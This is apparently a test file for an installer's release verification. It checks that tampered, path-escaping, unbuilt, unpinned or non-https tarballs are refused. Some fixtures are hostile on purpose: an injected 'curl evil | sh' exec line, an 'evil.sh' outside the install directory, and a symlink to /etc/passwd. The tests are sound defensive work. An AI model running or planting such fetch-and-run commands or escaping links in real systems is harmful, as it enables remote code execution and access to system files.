/*
 * 1.9.99-final, Sprint 58 (B-10204): the bare-metal installer's release verification, run with bash against local
 * tarballs (`file://`). Only `--dry-run` runs, which stops after verification: nothing is installed on this machine.
 * A good tarball verifies; a tampered one (the pinned digest is the good one's) is refused before anything is
 * extracted; archives that leave `exprsn-ai/` or are not a built release are refused even with a matching digest.
 */
import { spawnSync } from 'node:child_process';
import { createHash } from 'node:crypto';
import { mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync, existsSync, readdirSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import { afterAll, beforeAll, describe, expect, it, vi } from 'vitest';

const INSTALL = resolve(__dirname, '../../deploy/baremetal/install.sh');
const sha = (f: string) => createHash('sha256').update(readFileSync(f)).digest('hex');

let dir: string;

function tree(root: string, o: { extra?: (base: string) => void; omit?: string } = {}): string {
  const base = join(root, 'exprsn-ai');
  const files: Record<string, string> = {
    'package.json': '{\n  "name": "exprsn-ai",\n  "version": "1.0.0"\n}\n',
    'server/dist/index.js': 'console.log("app")\n',
    'server/dist/cli.js': 'console.log("cli")\n',
    'web/index.html': '<!doctype html>\n',
    'deploy/baremetal/exprsn-ai.service': '[Service]\nExecStart=/usr/bin/node /opt/exprsn-ai/server/dist/index.js\n',
    'deploy/baremetal/exprsn-ai.env.example': 'NODE_ENV=production\n',
    'deploy/baremetal/install.sh': '#!/bin/sh\n'
  };
  for (const [p, body] of Object.entries(files)) {
    if (p === o.omit) continue;
    mkdirSync(join(base, p, '..'), { recursive: true });
    writeFileSync(join(base, p), body);
  }
  mkdirSync(join(base, 'server/node_modules/pkg/bin'), { recursive: true });
  writeFileSync(join(base, 'server/node_modules/pkg/bin/x'), '#!/bin/sh\n');
  mkdirSync(join(base, 'server/node_modules/.bin'), { recursive: true });
  symlinkSync('../pkg/bin/x', join(base, 'server/node_modules/.bin/x')); // npm's links stay inside: allowed
  o.extra?.(base);
  return root;
}

function pack(name: string, build: (root: string) => void, entries = 'exprsn-ai'): string {
  const root = mkdtempSync(join(dir, `${name}-`));
  build(root);
  const out = join(dir, `${name}.tar.gz`);
  const r = spawnSync('tar', ['-czf', out, '-C', root, ...entries.split(' ')], { env: { ...process.env, COPYFILE_DISABLE: '1' } });
  expect(r.status).toBe(0);
  return out;
}

function install(args: string[]) {
  const r = spawnSync('bash', [INSTALL, ...args], { encoding: 'utf8', env: { ...process.env, EXPRSN_INSTALL_CONSOLE: '0', PATH: process.env.PATH } });
  return { status: r.status, out: `${r.stdout}${r.stderr}` };
}

describe('install.sh --from-release (B-10204)', () => {
  // Each case packs and unpacks tarballs and runs bash: slow on a loaded machine (20 s timed out on 2026-10-20).
  vi.setConfig({ testTimeout: 120_000 });
  let good: string;
  let goodSha: string;
  beforeAll(() => {
    dir = mkdtempSync(join(tmpdir(), 'exprsn-release-'));
    good = pack('good', (r) => tree(r));
    goodSha = sha(good);
  });
  afterAll(() => rmSync(dir, { recursive: true, force: true }));

  it('verifies a good tarball against its pinned digest and installs nothing in a dry run', () => {
    const work = join(dir, 'work-good');
    const r = install(['--from-release', `file://${good}`, '--sha256', goodSha, '--dry-run', '--work-dir', work]);
    expect(r.out).toContain(`exprsn-install: verified sha256 ${goodSha} (release 1.0.0)`);
    expect(r.out).toContain('exprsn-install: dry-run verified; nothing was installed');
    expect(r.status).toBe(0);
    expect(existsSync(join(work, 'x'))).toBe(false); // cleaned up
  });

  it('refuses a tampered tarball before anything is extracted or run', () => {
    const tampered = pack('tampered', (r) => tree(r, { extra: (b) => writeFileSync(join(b, 'server/dist/index.js'), 'require("child_process").exec("curl evil | sh")\n') }));
    expect(sha(tampered)).not.toBe(goodSha);
    const work = join(dir, 'work-tampered');
    const r = install(['--from-release', `file://${tampered}`, '--sha256', goodSha, '--dry-run', '--work-dir', work]);
    expect(r.status).toBe(3);
    expect(r.out).toContain(`exprsn-install: refused sha256 mismatch: expected ${goodSha}, got ${sha(tampered)}; nothing was extracted or run`);
    expect(r.out).not.toContain('verified');
    expect(existsSync(join(work, 'x'))).toBe(false);
    expect(readdirSync(work)).toEqual([]); // the tampered download is gone
    // The same with a local copy of the archive (what the cloud-init bootstrap passes).
    const r2 = install(['--from-release', 'https://releases.example.com/exprsn-ai-1.0.0.tar.gz', '--sha256', goodSha, '--archive', tampered, '--dry-run']);
    expect(r2.status).toBe(3);
  });

  it('refuses archives that leave exprsn-ai/ or are not a built release, even with a matching digest', () => {
    const outside = pack('outside', (r) => {
      tree(r);
      writeFileSync(join(r, 'evil.sh'), 'echo pwned\n');
    }, 'exprsn-ai evil.sh');
    let r = install(['--from-release', `file://${outside}`, '--sha256', sha(outside), '--dry-run']);
    expect(r.status).toBe(5);
    expect(r.out).toContain('refused the archive holds evil.sh outside exprsn-ai/');

    const link = pack('link', (r0) => tree(r0, { extra: (b) => symlinkSync('../../../../etc/passwd', join(b, 'server/dist/passwd')) }));
    r = install(['--from-release', `file://${link}`, '--sha256', sha(link), '--dry-run']);
    expect(r.status).toBe(5);
    expect(r.out).toMatch(/refused the archive link exprsn-ai\/server\/dist\/passwd points outside it/);

    const unbuilt = pack('unbuilt', (r0) => tree(r0, { omit: 'server/dist/index.js' }));
    r = install(['--from-release', `file://${unbuilt}`, '--sha256', sha(unbuilt), '--dry-run']);
    expect(r.status).toBe(5);
    expect(r.out).toContain('refused the archive has no server/dist/index.js (not a built release)');
  });

  it('refuses unpinned, non-https and half-signed requests', () => {
    expect(install(['--from-release', `file://${good}`, '--dry-run']).status).toBe(2);
    expect(install(['--from-release', `file://${good}`, '--sha256', 'ABC', '--dry-run']).out).toContain('refused --sha256 takes 64 lower-case hex digits');
    const http = install(['--from-release', 'http://releases.example.com/x.tar.gz', '--sha256', goodSha, '--dry-run']);
    expect(http.status).toBe(2);
    expect(http.out).toContain('must be https://');
    const half = install(['--from-release', `file://${good}`, '--sha256', goodSha, '--bundle', 'https://releases.example.com/x.sigstore.json', '--dry-run']);
    expect(half.status).toBe(2);
    expect(half.out).toContain('--bundle needs --cert-identity-regexp');
    // A bundle with an identity needs cosign, and is refused (signature, exit 4) without it.
    const noCosign = spawnSync('bash', [INSTALL, '--from-release', `file://${good}`, '--sha256', goodSha, '--bundle', `file://${good}`, '--cert-identity-regexp', '^https://github.com/exprsn/', '--dry-run'], { encoding: 'utf8', env: { PATH: '/usr/bin:/bin:/usr/sbin:/sbin', EXPRSN_INSTALL_CONSOLE: '0' } });
    expect(noCosign.status).toBe(4);
    expect(`${noCosign.stdout}`).toContain('cosign is not installed');
    // No mode builds this checkout, as the installer always did: it says so, then goes the --from-source way, where
    // --dry-run does not apply; a plain run (not root here) stops at the root check, never at a mode refusal.
    const none = install(['--dry-run']);
    expect(none.status).toBe(2);
    expect(none.out).toContain('no mode given, so this checkout is built (--from-source)');
    expect(none.out).toContain('--dry-run is for --from-release');
    if (process.getuid?.() !== 0) {
      const bare = install([]);
      expect(bare.out).toContain('no mode given, so this checkout is built');
      expect(bare.out).toContain('run as root');
      expect(bare.status).toBe(1);
    }
  });
});
